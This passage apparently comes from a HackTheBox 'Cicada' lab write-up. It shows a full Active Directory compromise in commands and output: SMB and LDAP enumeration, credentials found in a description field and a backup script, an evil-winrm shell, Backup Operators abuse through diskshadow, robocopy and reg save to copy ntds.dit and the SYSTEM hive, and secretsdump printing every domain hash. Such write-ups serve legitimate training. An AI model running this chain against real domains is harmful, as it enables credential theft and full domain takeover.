+└─$</span></mark></span><span class="SemanticString"><span> netexec smb 10.129.198.55 -u &#x27;michael.wrightson&#x27; -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; --shares     
+
+SMB         10.129.198.55   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.198.55   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.129.198.55   445    CICADA-DC        [+] Enumerated shares
+SMB         10.129.198.55   445    CICADA-DC        Share           Permissions     Remark
+SMB         10.129.198.55   445    CICADA-DC        -----           -----------     ------
+SMB         10.129.198.55   445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.129.198.55   445    CICADA-DC        C$                              Default share
+SMB         10.129.198.55   445    CICADA-DC        DEV                             
+SMB         10.129.198.55   445    CICADA-DC        HR              READ            
+SMB         10.129.198.55   445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.129.198.55   445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.129.198.55   445    CICADA-DC        SYSVOL          READ            Logon server share </span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7809fb915ebd8aea88e45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f780238435e50802713eb7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP389 — LDAP:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f7801f9867c36cb2987b93" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user can also connect to LDAP. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ldapdomaindump</code></span><span class="SemanticString"> to dump out users, groups, and other OUs in the domain.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78039a41cff995cb1c711" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada/ldap]
+└─$</span></mark></span><span class="SemanticString"><span> ldapdomaindump 10.129.198.55 -u &#x27;CICADA\michael.wrightson&#x27; -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;
+
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada/ldap]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 228
+drwxr-xr-x 2 chengw chengw  4096 Oct  2 19:41 .
+drwxr-xr-x 6 chengw chengw  4096 Oct  2 01:58 ..
+-rw-r--r-- 1 chengw chengw  1274 Oct  2 19:41 domain_computers_by_os.html
+-rw-r--r-- 1 chengw chengw   371 Oct  2 19:41 domain_computers.grep
+-rw-r--r-- 1 chengw chengw  1266 Oct  2 19:41 domain_computers.html
+-rw-r--r-- 1 chengw chengw  9486 Oct  2 19:41 domain_computers.json
+-rw-r--r-- 1 chengw chengw 10424 Oct  2 19:41 domain_groups.grep
+-rw-r--r-- 1 chengw chengw 17626 Oct  2 19:41 domain_groups.html
+-rw-r--r-- 1 chengw chengw 85912 Oct  2 19:41 domain_groups.json
+-rw-r--r-- 1 chengw chengw   256 Oct  2 19:41 domain_policy.grep
+-rw-r--r-- 1 chengw chengw  1152 Oct  2 19:41 domain_policy.html
+-rw-r--r-- 1 chengw chengw  6026 Oct  2 19:41 domain_policy.json
+-rw-r--r-- 1 chengw chengw    71 Oct  2 19:41 domain_trusts.grep
+-rw-r--r-- 1 chengw chengw   828 Oct  2 19:41 domain_trusts.html
+-rw-r--r-- 1 chengw chengw     2 Oct  2 19:41 domain_trusts.json
+-rw-r--r-- 1 chengw chengw 14442 Oct  2 19:41 domain_users_by_group.html
+-rw-r--r-- 1 chengw chengw  2171 Oct  2 19:41 domain_users.grep
+-rw-r--r-- 1 chengw chengw  5992 Oct  2 19:41 domain_users.html
+-rw-r--r-- 1 chengw chengw 20845 Oct  2 19:41 domain_users.json</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780c5b173f6eab1d29064" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at the users, a password is found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">david.orelious</code></span><span class="SemanticString">&#x27;s description field.</span></span></p></div><div id="https://www.notion.so/1990b98a88f78030ab32fba36c07eca7" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F74cbf5ca-96d7-45f9-9e4e-f34ff4d73b73%2Fimage.png?width=707.984375&amp;table=block&amp;id=1990b98a-88f7-8030-ab32-fba36c07eca7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F74cbf5ca-96d7-45f9-9e4e-f34ff4d73b73%2Fimage.png?width=707.984375&amp;table=block&amp;id=1990b98a-88f7-8030-ab32-fba36c07eca7" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1990b98a88f780e2be56ecd4014ee368" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This might seem far-fetched, but it does happen, especially in older systems. Sometimes sysadmins store sensitive info in description fields or other attributes, thinking they won’t be accessible to others.</span></span></p></div><div id="https://www.notion.so/1990b98a88f780aeb8c7c29f3637f86e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7806d9ebfc32d2b2e6f36" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SMB Dev Share Access:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f780e6aabacb1d7e8d6f65" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">David have read access to the Dev share.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780c3ada4d568bd781f78" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.198.55 -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --shares
+
+SMB         10.129.198.55   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.198.55   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SMB         10.129.198.55   445    CICADA-DC        [+] Enumerated shares
+SMB         10.129.198.55   445    CICADA-DC        Share           Permissions     Remark
+SMB         10.129.198.55   445    CICADA-DC        -----           -----------     ------
+SMB         10.129.198.55   445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.129.198.55   445    CICADA-DC        C$                              Default share
+SMB         10.129.198.55   445    CICADA-DC        DEV             READ            
+SMB         10.129.198.55   445    CICADA-DC        HR              READ            
+SMB         10.129.198.55   445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.129.198.55   445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.129.198.55   445    CICADA-DC        SYSVOL          READ            Logon server share
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;david.orelious%aRt$Lp#7t*VQ!3&#x27; \\\\cicada.htb\\DEV
+
+Try &quot;help&quot; to get a list of possible commands.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+  .                                   D        0  Thu Mar 14 23:01:39 2024
+  ..                                  D        0  Thu Mar 14 22:51:29 2024
+  Backup_script.ps1                   A      601  Thu Aug 29 02:58:22 2024
+
+		4168447 blocks of size 4096. 310032 blocks available</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780bba023cb3e5cbbc8ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A single PowerShell script is in the share, and it contains credentials for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">emily.oscars</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78005b0b8ff8c0b969770" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token variable">$sourceDirectory</span> = <span class="token string">"C:\smb"</span>
+<span class="token variable">$destinationDirectory</span> = <span class="token string">"D:\Backup"</span>
+
+<span class="token variable">$username</span> = <span class="token string">"emily.oscars"</span>
+<span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"Q!3@Lp#M6b*7t*Vt"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
+<span class="token variable">$credentials</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential<span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span>
+<span class="token variable">$dateStamp</span> = <span class="token function">Get-Date</span> <span class="token operator">-</span>Format <span class="token string">"yyyyMMdd_HHmmss"</span>
+<span class="token variable">$backupFileName</span> = <span class="token string">"smb_backup_<span class="token variable">$dateStamp</span>.zip"</span>
+<span class="token variable">$backupFilePath</span> = <span class="token function">Join-Path</span> <span class="token operator">-</span>Path <span class="token variable">$destinationDirectory</span> <span class="token operator">-</span>ChildPath <span class="token variable">$backupFileName</span>
+<span class="token function">Compress-Archive</span> <span class="token operator">-</span>Path <span class="token variable">$sourceDirectory</span> <span class="token operator">-</span>DestinationPath <span class="token variable">$backupFilePath</span>
+<span class="token function">Write-Host</span> <span class="token string">"Backup completed successfully. Backup file saved to: <span class="token variable">$backupFilePath</span>"</span></span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7809f94c0e30738f263c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">From the LDAP dump we can see Emily is in the Remote Management group, meaning I can get a shell via WinRM.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78081bbacdc99514ad643" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u emily.oscars -p &#x27;Q!3@Lp#M6b*7t*Vt&#x27; -i cicada.htb    
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+cicada\emily.oscars</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780618f69dd70a78be32e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f78008a319e9db73116592" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1990b98a88f78098a7daf2b692e34dfb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+f15b00ee************************</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780f5b0fccaf5c1b41f82" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7804bac81fa0a13ffb595" class="Divider"></div><h3 id="https://www.notion.so/1990b98a88f780d8b063f49dbbb38480" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1990b98a88f780d8b063f49dbbb38480"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/1990b98a88f7803ebe72de0a8fdbf8e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Backup Operators Group Abuse:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f7801dae6edcdc774485e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Emily is in the Backup Operators group.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78036bcaff80b31bf8c04" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\emily.oscars.CICADA\desktop&gt;</span></mark></span><span class="SemanticString"><span> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780b4bd5ccd675afe7b54" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is a highly privileged group. According to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators">Microsoft’s docs</a></span><span class="SemanticString">:</span></span></p></div><blockquote id="https://www.notion.so/1990b98a88f78022841fd567a8c382c9" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files.</em></span></span></blockquote><div id="https://www.notion.so/1990b98a88f7804181e7d3d5b2136f4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For example, I can read into Administrator’s desktop folder:</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780fdbf5acf3d248e56a3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\emily.oscars.CICADA\desktop&gt;</span></mark></span><span class="SemanticString"><span> dir C:\users\Administrator\desktop
+
+ Volume in drive C has no label.
+ Volume Serial Number is 1B60-8905
+
+ Directory of C:\users\Administrator\desktop
+
+08/30/2024  10:06 AM    &lt;DIR&gt;          .
+08/26/2024  01:10 PM    &lt;DIR&gt;          ..
+10/01/2024  03:51 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)               0 bytes free</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f78041bf14e36224d9850f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The flag can be read by simply creating a backup of this folder.</span></span></p></div><div id="https://www.notion.so/1990b98a88f7808ca11ef42a29a8ddac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But more importantly, I can backup the entire C drive and extract </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString">. This file can be considered as the heart of Active Directory. It’s a database storing information of all AD objects, including user credentials. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators">This HackTricks page</a></span><span class="SemanticString"> shows several ways of exploiting this, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">diskshadow.exe</code></span><span class="SemanticString">, as it seems to be the most straightforward approach.</span></span></p></div><div id="https://www.notion.so/1990b98a88f780d28bbbd5ae4c87331c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7809cb953e8f275f5a41a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Creating Shadow Copy of C:\</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f7808296dec0e25d1316c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first create the following </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.dsh</code></span><span class="SemanticString"> file, as shown in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">this walkthrough</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1990b98a88f78053a72fd5161a237898" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>set context persistent nowriters
+add volume c: alias cdrive
+create
+expose %cdrive% e:</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f78078a035fc65fa592c13" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Running it with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">diskshadow</code></span><span class="SemanticString"> should create a copy of the C drive in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">E:\</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780acb312d6a9e65ff0de" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> upload exploit.dsh
+                                        
+Info: Uploading /home/ch3ng/machines/cicada/exploit.dsh to C:\windows\temp\exploit.dsh
+                                        
+Data: 120 bytes of 120 bytes copied
+                                        
+Info: Upload successful!
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> diskshadow /s exploit.dsh
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  CICADA-DC,  10/2/2024 12:58:01 PM
+
+-&gt; set context persistent nowriters
+-&gt; add volume c: alias cdrive
+-&gt; create
+Alias cdrive for shadow ID {626193c4-de9f-4808-8451-8c903851062c} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {0bdb8a73-4502-4839-bb6a-1d45bc52e0da} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {0bdb8a73-4502-4839-bb6a-1d45bc52e0da}
+
+	* Shadow copy ID = {626193c4-de9f-4808-8451-8c903851062c}		%cdrive%
+		- Shadow copy set: {0bdb8a73-4502-4839-bb6a-1d45bc52e0da}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
+		- Creation time: 10/2/2024 12:58:01 PM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: CICADA-DC.cicada.htb
+		- Service machine: CICADA-DC.cicada.htb
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&gt; expose %cdrive% e:
+-&gt; %cdrive% = {626193c4-de9f-4808-8451-8c903851062c}
+The shadow copy was successfully exposed as e:\.
+-&gt;</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780418547fcfe5a1c03ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString"> can be copied out using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">robocopy</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780f795a0f8e904cd543f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> robocopy /b e:\windows\ntds . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Wednesday, October 2, 2024 12:58:32 PM
+   Source : e:\windows\ntds\
+     Dest : C:\windows\temp\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+	                   1	e:\windows\ntds\
+	    New File  		  16.0 m	ntds.dit
+  0.0%
+  0.3%
+  0.7%
+  1.1%
+  1.5%
+ ...
+ 98.4%
+ 98.8%
+ 99.2%
+ 99.6%
+100%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           134,217,728 Bytes/sec.
+   Speed :             7,680.000 MegaBytes/min.
+   Ended : Wednesday, October 2, 2024 12:58:32 PM</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780baa742c4d74ff56149" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString"> is encrypted with the boot key. This key is stored in the system hive, which can also be extracted using Backup Operators’ privileges.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780d2a2d1e2f03df9d27c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> reg save hklm\system .\system
+
+The operation completed successfully.</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780048cf2e26c6c75576a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f78022af1cff6eccea4906" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f78012a61cec395408b4b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Extracting Admin Hash:</strong></span></span></p></div><div id="https://www.notion.so/1990b98a88f780fc833fce0142788e12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With both files, I can simply let </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-secretsdump</code></span><span class="SemanticString"> do the extraction.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780f09414f086c028be8c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-secretsdump -ntds ntds.dit -system system local
+
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
+cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
+cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
+cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
+cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
+cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
+Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
+Administrator:des-cbc-md5:c8838c9b10c43b23
+CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
+CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
